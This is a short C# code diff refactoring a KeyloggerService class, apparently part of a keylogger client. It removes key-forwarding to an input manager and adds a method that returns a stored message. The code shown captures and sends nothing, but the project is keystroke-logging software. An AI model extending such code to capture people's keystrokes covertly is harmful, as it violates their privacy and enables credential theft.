@@ -13,13 +13,12 @@ namespace Client
         
         public static bool Running = false;
 
-        public InputManagerKeylogger Input;
-        public com
+        private string fullMessage;
 
-        public KeyloggerService(InputManagerKeylogger input)
-        {
-            Input = input;
-        }
+        public InputManagerKeylogger Input;
+       // public com          
+
+      
 
         public KeyloggerService()
         {
@@ -31,13 +30,19 @@ namespace Client
             Running = true;
         }
 
-        public string UpdateLogs(Keys key, bool ctrl, bool shift, bool alt)
+        public void setValues(string mess)
+        {
+            fullMessage = mess;
+        }
+
+        public string UpdateLogs()
         {
 
 
             if(Running)
             {
-                Input.KeyDown(key, ctrl, shift, alt);
+                return fullMessage;
+
             }
 
 
